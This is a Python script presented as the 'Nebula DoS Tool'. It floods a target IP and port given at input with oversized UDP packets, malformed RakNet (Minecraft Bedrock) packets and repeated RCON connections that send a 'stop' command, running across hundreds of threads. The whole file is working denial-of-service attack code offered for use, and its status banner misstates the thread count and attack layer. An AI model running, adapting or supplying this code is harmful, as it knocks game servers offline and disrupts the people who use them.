import zlib
import socket
import struct
import time
import os
import sys
import random
import threading

# Nebula DoS Tool Coded By @n0isemcpe
# Dont Copy!

def rawflood(target_ip, target_port):
  target = (target_ip, target_port)
  magic = "00ffff00fefefefefdfdfdfd12345678"
  magicbytes = bytes.fromhex(magic)
  fake_size = 147483647
  size = struct.pack('<i', fake_size)
  pids = [
    b'\x05',
    b'\x07',
    b'\x84',
    b'\xff',
    b'\x00',
    b'\x13',
    b'\x80'
  ]

  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    lenr = random.randint(50000, 60000)
    raw = os.urandom(lenr)
    a1 = b"L"*1024
    a2 = zlib.compress(a1, level=9)
    pid = random.choice(pids)
    packet = size + b'\x84' + magicbytes + a2 + pid + raw
    for i in range(1000):
      s.sendto(packet, (target_ip, target_port))
    s.close()

def raknetflood(target_ip, target_port):
  packets = [
    b'\xfe\x78\x9ck\x61\x64\x60\x60\x60\x8a\xf0\x48\xcd\xc9\xc9\x07\x00\x12\x19\x02\x47', # Chat Packet
    b'\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78', # Unconnected Ping
    b'\x13\x01\x00\x00\xc8\x42\x00\x00\x8c\x42\x00\x00\xc8\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01', # Move Packet
    b'\x05\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x06' + (b'\x00' * 1446), # Open Connection Request 1
    b'\x07\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x04\x7f\x00\x00\x01\x04\xd2\x05\xb4\x00\x00\x00\x00\x00\x00\x00\x01',
    b'\xfe\x78\x9c\xff\xff\xff\xff\xff\xff\xff\xff',
    b'\x13\x04\x7f\x00\x00\x01\x04\xd2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
    b'\x19\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x0b',
    b'\xfe\xff\xff\xff\xff\x07\x78\x9c\x01\x00\x00\xff\xff\x01\x02\x03\x04',
    b'\x05\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x06' + (b'\x41' * 1450),
    b'\xfe' + (b'\x80' * 50) + b'\x01'
  ]
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(300):
      pack = random.choice(packets)
      s.sendto(pack, (target_ip, target_port))
    s.close()

def rconflood(target_ip, target_port):
  packet = b'\x11\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00xddddddseninbenaqq\x00\x00'
  packet2 = b'\x0e\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00stop\x00\x00'
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target_ip, target_port))
      s.sendall(packet)
      s.sendall(packet2)
      s.close()
    except Exception as e:
      pass

# Display

banner = """

   ▄▄     ▄▄▄                ▄▄
   ██▄   ██▀      █▄          ██
   ███▄  ██       ██          ██
   ██ ▀█▄██ ▄█▀█▄ ████▄ ██ ██ ██ ▄▀▀█▄
   ██   ▀██ ██▄█▀ ██ ██ ██ ██ ██ ▄█▀██
 ▀██▀    ██▄▀█▄▄▄▄████▀▄▀██▀█▄██▄▀█▄██

[@n0isemcpe]           [Version 1.0.0]
"""

os.system("clear")
print("\033[31m" + banner)
print(" ")
time.sleep(1)
target_ip = input("\033[34mTarget IP: ")
target_port = int(input("Target Port: "))
print(" ")
print("Please Wait...")

for i in range(500):
  t1 = threading.Thread(target=rawflood,args=(target_ip, target_port), daemon=True)
  t1.start()
for i in range(50):
  t2 = threading.Thread(target=raknetflood,args=(target_ip, target_port), daemon=True)
  t3 = threading.Thread(target=rconflood,args=(target_ip, target_port), daemon=True)
  t2.start()
  t3.start()

print("\033[31m" + banner)
print(" ")
print("====================")
print(" ")
print(f"\033[34mTarget IP: {target_ip}")
print(f"Target Port: {target_port}")
print("Threads: 300")
print("Type: Layer7")
print("Status: ATTACKING")
print(" ")
print("\033[31m====================")
while True:
  time.sleep(1)